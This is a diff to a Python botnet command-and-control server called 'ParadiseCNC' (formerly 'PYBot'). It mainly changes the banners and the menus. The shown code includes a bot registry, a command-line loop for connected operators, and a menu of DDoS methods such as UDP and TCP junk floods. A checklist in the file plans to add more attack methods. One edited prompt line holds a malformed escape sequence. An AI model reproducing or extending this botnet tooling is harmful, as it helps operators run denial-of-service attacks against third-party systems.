@@ -1,17 +1,44 @@
 #!/usr/bin/env python3
 #-*- coding: utf-8 -*-
-# CNC Server
 #    ___       ___       ___       ___       ___       ___       ___       ___   
 #   /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \     /\  \  
 #  /::\  \   /::\  \   /::\  \   /::\  \   /::\  \   _\:\  \   /::\  \   /::\  \ 
 # /::\:\__\ /::\:\__\ /::\:\__\ /::\:\__\ /:/\:\__\ /\/::\__\ /\:\:\__\ /::\:\__\
 # \/\::/  / \/\::/  / \;:::/  / \/\::/  / \:\/:/  / \::/\/__/ \:\:\/__/ \:\:\/  /
 #    \/__/    /:/  /   |:\/__/    /:/  /   \::/  /   \:\__\    \::/  /   \:\/  / 
-#             \/__/     \|__|     \/__/     \/__/     \/__/     \/__/     \/__/  
+#             \/__/     \|__|     \/__/     \/__/     \/__/     \/__/     \/__/   
+
+########################
+#      ParadiseCNC     #
+#    Made by wodxgod   #
+# Recoded by D3fe4ted  #
+# -------------------- #
+#  Originally known as #
+#       - PYBot -      #
+# -------------------- #
+# - Added New Methods  #
+# - Cleaned up menus   #
+# - New look!          #
+########################
+
+# Checklist
+#add more methods to cnc and bot
+#document coding
 
 # Libraries
 import socket, threading, sys, time, ipaddress
 from colorama import Fore, init
+
+# Banners
+
+banner = """
+                                                          
+,------.                           ,--.,--.               
+|  .--. ' ,--,--.,--.--. ,--,--. ,-|  |`--' ,---.  ,---.  
+|  '--' |' ,-.  ||  .--'' ,-.  |' .-. |,--.(  .-' | .-. : 
+|  | --' \ '-'  ||  |   \ '-'  |\ `-' ||  |.-'  `)\   --. 
+`--'      `--`--'`--'    `--`--' `---' `--'`----'  `----' 
+\n"""
 
 about = """
     ┌────────────────────────────┐
@@ -32,7 +59,7 @@ help = """
 
 methods = """
     ┌───────────┬──────────────────────────────┐
-    │  Methods  │          Description         │
+    │  Headers  │          Description         │
     ├───────────┼──────────────────────────────┤
     │ * .udp    │  UDP Junk Flood              │
     │ * .tcp    │  TCP Junk Flood              │
@@ -45,7 +72,7 @@ methods = """
 bots = {}
 ansi_clear = '\033[2J\033[H'
 
-banner = """Welcome to Paradise. Enjoy your stay!\n"""
+
 
 # Validate IP
 def validate_ip(ip):
@@ -127,7 +154,7 @@ def command_line(client):
     for x in banner.split('\n'):
         send(client, x)
 
-    prompt = f'{Fore.LIGHTBLUE_EX}Paradise {Fore.LIGHTWHITE_EX}$ '
+    prompt = f'\x1b[Paradise {Fore.LIGHTWHITE_EX}$ '
     send(client, prompt, False)
 
     while 1:
